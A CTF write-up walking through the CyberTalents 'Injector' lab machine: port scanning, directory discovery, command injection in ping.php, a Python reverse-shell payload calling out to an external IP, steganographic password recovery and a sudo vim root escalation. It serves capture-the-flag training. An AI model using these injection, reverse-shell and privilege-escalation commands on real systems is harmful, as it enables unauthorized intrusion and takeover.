---
title:  "Cybertalents Injector Machine"
classes: wide
header:
  teaser: /img/talents.png
ribbon: MidnightBlue
categories:
  - CTF Writeups
---
        
                                        بسم الله الرحمن الرحيم   

#### Description
* Get The highest privilege on the machine and find the flag!
* VPN Target IP: 172.24.170.117
* Public Target IP: 18.156.1.235
* level:medium
* link : [`https://cybertalents.com/challenges/machines/injector`](https://cybertalents.com/challenges/machines/injector)

<img src="/img/injector/download.png" alt="Getting-gz" width="800" height="440">

#### Walkthrough
First of all, you should connect to CyberTalents VPN or public ip

* Reconnaissance
  * use nmap for port scan
  * find port 22 opened for ssh, and 80 for http
  * `	nmap -sC -sV ip`
  
<img src="/img/nmap.PNG" alt="Getting-gz" width="800" height="440">

  * We’ll See a Default Apache page
  * nothing interested 
  
<img src="/img/injector/server.PNG" alt="Getting-gz" width="800" height="440">

  * let’s discover the hidden directories & file using dirb or dirsearch
  *  `dirsearch -u http://172.24.170.117/ -e php -x 404,403`
    
<img src="/img/injector/dir1.PNG" alt="Getting-gz" width="800" height="440">
 
<img src="/img/injector/broswer1.PNG" alt="Getting-gz" width="800" height="220">

 * `dirsearch -u http://172.24.170.117/secret/ -e php -x 404,403`
 * nothing interesting
 * run dirsearch again
 
<img src="/img/injector/dir2.PNG" alt="Getting-gz" width="800" height="440">

  * I found ping.php
  
<img src="/img/injector/browser2.PNG" alt="Getting-gz" width="800" height="250">

 *  i found command injection
 * `127.0.0.1 ;pwd`
 
<img src="/img/injector/os.PNG" alt="Getting-gz" width="800" height="220">

* search about  reverse shell 
*  [`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
* befor you run the command,you shoud use nc listener
* `nc -nlvp 80000`
* `127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("41.34.134.166",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

<img src="/img/injector/shell.PNG" alt="Getting-gz" width="800" height="440">

<img src="/img/injector/connect.PNG" alt="Getting-gz" width="800" height="170">

  * stabilizing shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
  * now on `www-data` we should get a user
  * found photo in `/var/www`

<img src="/img/injector/photo.PNG" alt="Getting-gz" width="800" height="170">

<img src="/img/injector/photo1.PNG" alt="Getting-gz" width="800" height="100">

* copy it to our machine
* `nc -nlvp 8000 >photo1.jpg`
* `nc -w 3 ip 8000`

<img src="/img/injector/photo2.PNG" alt="Getting-gz" width="800" height="200">

* i tried to use strings,exiftool,binwalk,foremost in the image but useless
* `steghide extract -sf photo1.jpg`
* `cat password.txt`

<img src="/img/injector/password.PNG" alt="Getting-gz" width="800" height="440">

* we got a password
* search about user `cat /etc/passwd` found `alex`
* login `su alex ` with password `D0n41dTrump`

<img src="/img/injector/user.PNG" alt="Getting-gz" width="800" height="130">
 
 * Let’s do Some privesc
 * `sudo -l` for show the commands runs with root permissions
 
<img src="/img/injector/sudo.PNG" alt="Getting-gz" width="800" height="180">

  * search about use vim in privesc
  * `sudo vim -c ' : ! /bin/sh ' /usr/bin/vim`
  * `cat /root/root.txt`
  
<img src="/img/injector/roo.PNG" alt="Getting-gz" width="800" height="100">

* We got the final flag and complete task






